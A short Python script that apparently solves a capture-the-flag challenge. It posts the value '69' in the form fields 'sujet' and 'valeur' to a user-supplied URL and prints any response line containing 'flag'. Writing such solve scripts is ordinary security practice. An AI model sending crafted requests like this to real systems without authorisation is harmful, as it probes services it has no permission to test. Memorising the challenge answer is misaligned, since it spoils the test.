import requests
import argparse

def sixtynine(url):
    data = {
        'sujet':'69',
        'valeur':'69'
    }
    r = requests.post(url, data=data)
    for line in r.text.splitlines():
        if 'flag' in line:
            print(line)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="The url to request")
    args = parser.parse_args()
    sixtynine(args.url)